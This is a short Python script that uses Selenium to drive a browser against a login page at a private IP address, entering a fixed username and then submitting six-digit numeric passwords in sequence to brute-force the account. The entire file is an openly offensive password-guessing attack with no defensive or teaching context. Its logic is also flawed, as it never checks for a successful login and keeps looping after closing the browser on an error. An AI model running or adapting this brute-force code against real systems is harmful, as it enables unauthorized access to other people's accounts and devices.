#!/usr/bin/env python
# coding=utf-8
from selenium import webdriver

import time

dr = webdriver.Chrome()
dr.get('http://172.16.0.1')
userName_element = dr.find_element_by_xpath("//tbody//tr//td//input[@name='username']")
userName_element.send_keys('zd822021')
for num in range(600000,999999):
    password = '{:0>6}'.format(num)
    try:
        passWord_element = dr.find_element_by_xpath("//tbody//tr//td//input[@name='password']")
        passWord_element.send_keys(password)
        submit_element = dr.find_element_by_xpath("//tbody//tr//td//input[@type='submit']")
        submit_element.click()
        print password
    except Exception as err:
        print err
        print password
        dr.close()

